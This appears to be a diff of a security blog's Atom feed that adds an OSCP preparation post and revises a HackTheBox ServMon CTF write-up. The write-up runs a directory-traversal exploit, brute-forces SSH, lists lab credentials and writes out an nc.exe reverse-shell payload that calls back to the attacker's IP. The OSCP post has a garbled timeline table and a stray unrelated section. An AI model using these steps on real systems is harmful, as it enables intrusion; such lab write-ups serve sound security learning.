@@ -1,5 +1,144 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-23T18:34:37+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rajat.Rao</title><subtitle>Hi, My name is Rajat Rao. The blog focuses on security reseach and writeupss.</subtitle><author><name>Rajat Rao</name></author><entry><title type="html">HackTheBox ServMon Writeup</title><link href="http://localhost:4000/htb/2020/06/21/HackTheBox-ServMon/" rel="alternate" type="text/html" title="HackTheBox ServMon Writeup" /><published>2020-06-21T15:22:20+05:30</published><updated>2020-06-21T15:22:20+05:30</updated><id>http://localhost:4000/htb/2020/06/21/HackTheBox-ServMon</id><content type="html" xml:base="http://localhost:4000/htb/2020/06/21/HackTheBox-ServMon/">&lt;h2 id=&quot;brief&quot;&gt;Brief&lt;/h2&gt;
-&lt;p&gt;    On enumerating different services of &lt;code class=&quot;highlighter-rouge&quot;&gt;ServMon&lt;/code&gt; machine, we were able to find few confidentails files from &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service which discloses a hint saying that list of password is stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; uers desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt;. On assessing the software, it was vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;Directory Traversal&lt;/code&gt; vulnerability which helps us to conquer the &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan's&lt;/code&gt; desktop by using exploit available on exploit-db. On this point we have got a list of passsword and two usersname ( &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; ), we try to brute force the available &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH&lt;/code&gt; service on target machine using &lt;code class=&quot;highlighter-rouge&quot;&gt;Hydra&lt;/code&gt;. On the conclusion of brute forcing, we were able to find credentails of &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine&lt;/code&gt; and taking leverage of it, we ssh to the machine using &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine&lt;/code&gt; cracked password and get &lt;code class=&quot;highlighter-rouge&quot;&gt;proof.txt&lt;/code&gt;. Once we got the local access, enumeration helped us to find &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; running and on expxloitation of it using publicly available script, we were able to get maximum level of privelege and get &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-09T15:22:25+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rajat.Rao</title><subtitle>Hi, My name is Rajat Rao. The blog focuses on security reseach and writeupss.</subtitle><author><name>Rajat Rao</name></author><entry><title type="html">OSCP Journey &amp;amp; Guidance</title><link href="http://localhost:4000/oscp/2020/06/23/OSCP-Journey-&-Guidance/" rel="alternate" type="text/html" title="OSCP Journey &amp; Guidance" /><published>2020-06-23T14:35:23+05:30</published><updated>2020-06-23T14:35:23+05:30</updated><id>http://localhost:4000/oscp/2020/06/23/OSCP-Journey-&amp;-Guidance</id><content type="html" xml:base="http://localhost:4000/oscp/2020/06/23/OSCP-Journey-&amp;-Guidance/">&lt;p&gt;&lt;strong&gt;Offensive Security Certified Professional (OSCP)&lt;/strong&gt; is a foundational course of &lt;strong&gt;Offensive Security&lt;/strong&gt;. This post is for the target audience who are unsure about enrolling for OSCP certfication, guidance for OSCP preparation, a dedicated schedule to prerpare for OSCP (Yes! even for newbies)&lt;/p&gt;
+
+&lt;p&gt;Speaking about my OSCP journey, I received my OSCP certificate in November 2019 and I was able to clear it in my second attempt. A lot of miscalculaltions,  improper time management, inadequate pentesting environment lead me to failure as well as success. Not only OSCP helped me honing my Pentesting Skills but also attributes such time-management, never-give up attitude and most importantly, PATIENCE.&lt;/p&gt;
+
+&lt;p&gt;A person planning to enroll OSCP needs to have a lot of patience as at times (ALMOST EVERY TIME!), you get stuck, confused and reach a dead-end while practicing machines. Just like in school/college days, when get stuck in solving mathematical problem and the only person to look for are our professors (Kidding, your best friend always has the solution;P). My role would be something similar like a professor/friend to help you schedule and prepare for OSCP certification.&lt;/p&gt;
+
+&lt;p&gt;Enough about my part, getting to the main part i.e OSCP Guidance and Schedule. But before that, let us cover few introductory sections.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1)Certification Process&lt;/code&gt;: Virtual labs are assigned to you once you have bought the labs package to practice your skills and once the period is completed, you are asked to set a date for examination. The OSCP exam is 24-hour time limit and consists of a hands-on penetration test in Offensive Security’s isolated VPN network with a procture monitoring your work throughout the examination. You’ll receive the connection pages few minutes prior the examination which you have no prior knowledge or exposure. Post the exam, 24-hour time is alloted to for creaating and submitting the report.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2)Labs&lt;/code&gt;: Virtual labs are a dedicated lab consisting of a network of machines where one can practice/hone their pentestig skills. One can access these labs with the help VPN connectivity provided once you have paid for labs and time-frame of the labs depends upon the package you have dediced.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;Below is my 4 months journey of OSCP preparation. I have divided into 3 parts as follows:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;http://localhost:4000&quot;&gt;Pre-Enrollment Phase&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;&quot;&gt;Post-Enrollment Phase&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;&quot;&gt;Buffer Phase&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p id=&quot;Pre-Enrollment-Phase&quot;&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2 id=&quot;pre-enrollment-phase&quot;&gt;Pre-Enrollment Phase&lt;/h2&gt;
+
+&lt;p&gt;Prior enrolling for OSCP, I had decided to clear out my the very basic of Pentesting. In order to acheive that, I focused on the following things&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Linux Basics (Temrinal command usage)&lt;/strong&gt;: One needs to have a good hands on experience on Linux operating system. To get familiar with the commands and working of Kali linux, I practiced challenges provided over &lt;a href=&quot;https://overthewire.org/wargames/bandit/&quot;&gt;Bandit Overthewire&lt;/a&gt;. There are a total of &lt;code class=&quot;highlighter-rouge&quot;&gt;34 levels&lt;/code&gt; and I set a deadline of 15 days to finish it off. This will not only help you to make you familiar with terminal commands but also helps one to learn security topics.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Basics of CTF&lt;/strong&gt;: Once done with the above, I decided to understand the structure of CTF and how different scenarios and exploit environment are developed for CTF players. This step will make you understand the CTF environment. I was able to get a list of machines from my colleague &lt;a href=&quot;&quot;&gt;Pratik Jadhav&lt;/a&gt;. Following is the list of machines I solved before enrolling for OSCP:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;list&quot;&gt;List&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;hackfest series -&amp;gt; hackfest2016 : Quaoar,hackfest2016 : Sedna and hackfest2016 : Orcus&lt;/li&gt;
+  &lt;li&gt;Kioptrix Series&lt;/li&gt;
+  &lt;li&gt;SkyDog Series: Skydog, SkyDog 2016&lt;/li&gt;
+  &lt;li&gt;billu box&lt;/li&gt;
+  &lt;li&gt;sickos series 1 and 2&lt;/li&gt;
+  &lt;li&gt;Fristileak&lt;/li&gt;
+  &lt;li&gt;droopy&lt;/li&gt;
+  &lt;li&gt;Milnet&lt;/li&gt;
+  &lt;li&gt;Necromance&lt;/li&gt;
+  &lt;li&gt;Troll 1&lt;/li&gt;
+  &lt;li&gt;Acid Series: Server, Reloaded&lt;/li&gt;
+  &lt;li&gt;Lord of the root&lt;/li&gt;
+  &lt;li&gt;Sokar and Pwnlab machines&lt;/li&gt;
+  &lt;li&gt;Darknet&lt;/li&gt;
+  &lt;li&gt;DonkyDocker&lt;/li&gt;
+  &lt;li&gt;Mr ROBOT -&amp;gt; Easy to Medium&lt;/li&gt;
+  &lt;li&gt;Minotaur - &amp;gt; Medium&lt;/li&gt;
+  &lt;li&gt;pipe machine&lt;/li&gt;
+  &lt;li&gt;Zico machine. Great Machine - Easy to medium&lt;/li&gt;
+  &lt;li&gt;LazySysAdmin to&lt;/li&gt;
+  &lt;li&gt;covfefe - Very Easy machine.&lt;/li&gt;
+  &lt;li&gt;Breach SeriesBreach 1 and Breach 2 and Breach 3&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Out of the above, I was able to understand and solve 15 machines.&lt;/p&gt;
+
+&lt;p&gt;The entire step took around 15-20 days to concluded.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+&lt;p id=&quot;Post-Enrollment-Phase&quot;&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2 id=&quot;post-enrollment-phase&quot;&gt;Post-Enrollment Phase&lt;/h2&gt;
+
+&lt;p&gt;Once you have thoroughly followed the steps in Pre-Enrollment Phase, I can assure you are ready to enroll for OSCP labs. I followed the above and purchassed OSCP labs (60 days).&lt;/p&gt;
+
+&lt;p&gt;On purchasing the labs, you get a buffer of a week or so before the lab access gets started. As walkthroughs of machines mentioned in Pre-Enrollment Phase were available online, to test my pentesting knowledge, I started solving &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;HackTheBox&lt;/a&gt; machines. I was able to solve 2-3 easy machines during the buffer period (Without any hint).&lt;/p&gt;
+
+&lt;p&gt;Once the labs access is started, you get study materials with respect to OSCP (pdf and videos). I highly recommend you’all to finish the pdf/videos as soon as possible. I mostly finished the study material during my fillers time. For instance, I read the study material while tarveling, lunch, coffee breaks and more. This not only helped me to understand the core of approach but strengthen the basic.&lt;/p&gt;
+
+&lt;p&gt;In the 60 days of access, I was able to solve around 35 machines. In the given period of time, I would ask to ones appearing for OSCP to solve atleast 30 machines.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+&lt;p id=&quot;Buffer-Phase&quot;&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;h2 id=&quot;buffer-phase&quot;&gt;Buffer Phase&lt;/h2&gt;
+
+&lt;p&gt;Once the Lab access is over, make sure you set an exam date 14 days post the lab access get expired. Exam date can be selected anytime once the lab access is provided.&lt;/p&gt;
+
+&lt;p&gt;As mentioned above, I got a buffer of 14 days post lab access expired. During this phase, the very first I practiced &lt;code class=&quot;highlighter-rouge&quot;&gt;Buffer OverFlow&lt;/code&gt;. There are lot of online open sources tools where one can practice &lt;code class=&quot;highlighter-rouge&quot;&gt;Buffer OverFlow&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Following is the list of software to practive Buffer OverFlow&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Slmail&lt;/li&gt;
+  &lt;li&gt;Floatftp&lt;/li&gt;
+  &lt;li&gt;Pcftp&lt;/li&gt;
+  &lt;li&gt;Minishare&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Concept of Buffer OverFlow with good hands-on will take 3-4 days.&lt;/p&gt;
+
+&lt;p&gt;Post Buffer Overflow, we can again finish off the remainder machines which were listed in the &lt;code class=&quot;highlighter-rouge&quot;&gt;Pre-Enrollment Phase&lt;/code&gt;. Along with that we can make notes of all possible methods/steps discovered by you while practing lab machines.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Topic&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Timeline&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Pre-Enrollment Phase&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;$1600&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Post-Enrollment Phase&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;$12&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Buffer Phase&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;$1&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3&gt;2.1 || Genymotion&lt;/h3&gt;
+
+&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Start Genymotion&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/1.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;</content><author><name>Rajat Rao</name></author><category term="[&quot;OSCP&quot;]" /><summary type="html">Offensive Security Certified Professional (OSCP) is a foundational course of Offensive Security. This post is for the target audience who are unsure about enrolling for OSCP certfication, guidance for OSCP preparation, a dedicated schedule to prerpare for OSCP (Yes! even for newbies)</summary></entry><entry><title type="html">HackTheBox ServMon Writeup</title><link href="http://localhost:4000/htb/2020/06/21/HackTheBox-ServMon/" rel="alternate" type="text/html" title="HackTheBox ServMon Writeup" /><published>2020-06-21T15:22:20+05:30</published><updated>2020-06-21T15:22:20+05:30</updated><id>http://localhost:4000/htb/2020/06/21/HackTheBox-ServMon</id><content type="html" xml:base="http://localhost:4000/htb/2020/06/21/HackTheBox-ServMon/">&lt;h2 id=&quot;brief&quot;&gt;Brief&lt;/h2&gt;
+&lt;p&gt;    On enumerating different services of &lt;code class=&quot;highlighter-rouge&quot;&gt;ServMon&lt;/code&gt; machine, we were able to find few confidentail files from &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service which disclosed a hint saying that a file consisting of passwords being stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; users desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt;. Assessing the software, it was vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;Directory Traversal&lt;/code&gt; vulnerability which helped us to conquer the &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan's&lt;/code&gt; desktop by using exploit available on exploit-db.As we have got a list of passsword and two usersnames ( &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; ), we try to brute force the available &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH&lt;/code&gt; service on target machine using &lt;code class=&quot;highlighter-rouge&quot;&gt;Hydra&lt;/code&gt;. Brute Forcing helped us to find credentails of &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine&lt;/code&gt; and taking leverage of it, we ssh’ed to the machine using &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine&lt;/code&gt; cracked password and get &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;. Once we got the local access, enumeration helped us to find &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; running and on exploitation of it using publicly available script, we were able to get maximum level of privelege and get &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt; &lt;/p&gt;
 
@@ -15,13 +154,13 @@
     &lt;p&gt;Brute force &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH&lt;/code&gt; service using two usernames &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Nadine&lt;/code&gt; against &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
-    &lt;p&gt;Login as &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine&lt;/code&gt; with credentials found via &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt; ( &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine:L1k3B1gBut7s@W0rk&lt;/code&gt; )&lt;/p&gt;
+    &lt;p&gt;Login as &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH&lt;/code&gt; service with credentials found via &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra&lt;/code&gt; ( &lt;code class=&quot;highlighter-rouge&quot;&gt;nadine:L1k3B1gBut7s@W0rk&lt;/code&gt; )&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;Get &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
-    &lt;p&gt;Local enumeramation discloses usage of &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; and also &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; ( &lt;strong&gt;8443&lt;/strong&gt; )report discloses the same in target machine&lt;/p&gt;
+    &lt;p&gt;Local enumeration discloses usage of &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; and also &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; ( &lt;strong&gt;8443&lt;/strong&gt; ) report discloses the same in target machine&lt;/p&gt;
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;Search for &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt; leads to publicly available writeup ( &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit-db&lt;/code&gt; ) to escalate the privilege.&lt;/p&gt;
@@ -197,7 +336,7 @@
 
 &lt;h3 id=&quot;12--ftp&quot;&gt;1.2 || FTP&lt;/h3&gt;
 
-&lt;p&gt;Nmap result shows us that it has &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service running and on detecting &lt;code class=&quot;highlighter-rouge&quot;&gt;Anonymous FTP&lt;/code&gt;, we were able to get FTP access of the machine. &lt;code class=&quot;highlighter-rouge&quot;&gt;Anonymous FTP&lt;/code&gt; reveals a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;Confidential.txt&lt;/code&gt; which gives us hint of a &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwors.txt&lt;/code&gt; file being stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathane's&lt;/code&gt; Desktop.&lt;/p&gt;
+&lt;p&gt;Nmap result shows us that it has &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service running and on detecting &lt;code class=&quot;highlighter-rouge&quot;&gt;Anonymous FTP&lt;/code&gt;, we were able to get FTP access of the machine. &lt;code class=&quot;highlighter-rouge&quot;&gt;Anonymous FTP&lt;/code&gt; reveals a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;Confidential.txt&lt;/code&gt; which gives us hint of a &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; file being stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathane's&lt;/code&gt; Desktop.&lt;/p&gt;
 
 &lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;FTP access&lt;/code&gt;&lt;/p&gt;
 
@@ -215,13 +354,13 @@
 
 &lt;h3 id=&quot;13--nvms-1000-port-80&quot;&gt;1.3 || NVMS-1000 (Port 80)&lt;/h3&gt;
 
-&lt;p&gt;On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt;. Exploit-Db suggests an exploit of &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt; being vulnerable to Directory Traversal attack.&lt;/p&gt;
+&lt;p&gt;On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt;. Exploit-db suggests an exploit of &lt;code class=&quot;highlighter-rouge&quot;&gt;NVMS-1000&lt;/code&gt; being vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;Directory Traversal&lt;/code&gt; attack.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;POC&lt;/strong&gt;: &lt;a href=&quot;https://www.expxloit-db.com/exploits/48311&quot;&gt;https://www.expxloit-db.com/exploits/48311&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/4.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Executing the script by providing proper paarameters as shown in below picture results in access of &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan's&lt;/code&gt; desktop.&lt;/p&gt;
+&lt;p&gt;Executing the script by providing proper parameters as shown in below picture results in access of &lt;code class=&quot;highlighter-rouge&quot;&gt;Passwords.txt&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;Nathan's&lt;/code&gt; desktop.&lt;/p&gt;
 
 &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ python 48311.py http://10.10.10.184/ /Users/Nathan/Desktop/Passwords.txt passwords_list.txt&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -261,13 +400,13 @@
 
 &lt;h3 id=&quot;31--enumerate-local-system&quot;&gt;3.1 || Enumerate local system&lt;/h3&gt;
 
-&lt;p&gt;Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt;. This service was also discover via nmap output ( &lt;code class=&quot;highlighter-rouge&quot;&gt;8443&lt;/code&gt; .)&lt;/p&gt;
+&lt;p&gt;Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt;. This service was also discovered via nmap output ( &lt;code class=&quot;highlighter-rouge&quot;&gt;8443&lt;/code&gt; .)&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Port 8443&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/9.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;On searching for exploits with respect to &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt;, we were able to find a wtiteup on exploit-db to escalte the privilege by exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt; exploit.&lt;/p&gt;
+&lt;p&gt;On searching for exploits with respect to &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt;, we were able to find a writeup on exploit-db to escalte the privilege by exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient ++&lt;/code&gt; vulenrability.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;NSClient ++ writeup on exploit-db&lt;/strong&gt;: &lt;a href=&quot;https://www.expxloit-db.com/exploits/46802&quot;&gt;https://www.expxloit-db.com/exploits/46802&lt;/a&gt;&lt;/p&gt;
 
@@ -295,14 +434,14 @@
 
 &lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 3: Create Payload&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;As per the exploit poc, we are supposed to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;.bat&lt;/code&gt; consisting of the below payload and add as an external script to &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;As per the exploit poc, we are supposed to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;.bat&lt;/code&gt; consisting of the below payload and add as an external script to &lt;code class=&quot;highlighter-rouge&quot;&gt;NSClient++&lt;/code&gt; service.&lt;/p&gt;
 
 &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo off&lt;/span&gt;
 &lt;span class=&quot;s&quot;&gt;C:\temp\nc.exe 10.10.15.137 443 -e cmd.exe&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;where,&lt;/p&gt;
 
-&lt;p&gt;    &lt;strong&gt;10.10.15.137&lt;/strong&gt;: Listening HOST ( Attacking machine’s IP address)&lt;/p&gt;
+&lt;p&gt;    &lt;strong&gt;10.10.15.137&lt;/strong&gt;: Listening Host ( Attacking machine’s IP address)&lt;/p&gt;
 
 &lt;p&gt;    &lt;strong&gt;443&lt;/strong&gt;: Listening Port ( Attacking machine’s listening port)&lt;/p&gt;
 
@@ -313,9 +452,9 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/14.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Adding an external script can be acheived by logging in via the web portal availble on port &lt;code class=&quot;highlighter-rouge&quot;&gt;8443&lt;/code&gt;. However, for some strange reason, the web portal seemt to be very unstable and hence, we’ll be following &lt;code class=&quot;highlighter-rouge&quot;&gt;API&lt;/code&gt; available in documentation of &lt;a href=&quot;&quot;&gt;NSClient_++&lt;/a&gt; via using curl commands locally.&lt;/p&gt;
+&lt;p&gt;Adding an external script can be acheived by logging in via the web portal availble on port &lt;code class=&quot;highlighter-rouge&quot;&gt;8443&lt;/code&gt;. However, for some strange reason, the web portal seemt to be very unstable and hence, we’ll be using &lt;code class=&quot;highlighter-rouge&quot;&gt;API&lt;/code&gt; available in documentation of &lt;a href=&quot;&quot;&gt;NSClient_++&lt;/a&gt; via using curl commands locally.&lt;/p&gt;
 
-&lt;p&gt;Under the &lt;code class=&quot;highlighter-rouge&quot;&gt;Scripts&lt;/code&gt; section API documentation, we were able to discover a method to add an external script via command line.&lt;/p&gt;
+&lt;p&gt;Under the &lt;code class=&quot;highlighter-rouge&quot;&gt;Scripts&lt;/code&gt; section of API documentation, we were able to discover a method to add an external script via command line.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/15.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
 
@@ -325,7 +464,7 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/ServMon/16.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;On using the above command, it prompts for a password. The password to be used is password discover in &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 1&lt;/code&gt; ( &lt;code class=&quot;highlighter-rouge&quot;&gt;ew2x6SsGTxjRwXOT&lt;/code&gt; )&lt;/p&gt;
+&lt;p&gt;On using the above command, it prompts for a password. The password to be used is password discovered in &lt;strong&gt;Step 1&lt;/strong&gt; ( &lt;code class=&quot;highlighter-rouge&quot;&gt;ew2x6SsGTxjRwXOT&lt;/code&gt; )&lt;/p&gt;
 
 &lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 4: Download nc.exe to target machine&lt;/code&gt;&lt;/p&gt;
 
@@ -360,7 +499,7 @@
 
 &lt;h3 id=&quot;32--privileged-shell&quot;&gt;3.2 || Privileged Shell&lt;/h3&gt;
 
-&lt;p&gt;Before performing &lt;code class=&quot;highlighter-rouge&quot;&gt;Step 5&lt;/code&gt; from the previous section, we need to create a listener at out attacking machine. Below is the command to listening for getting a reverse shell:&lt;/p&gt;
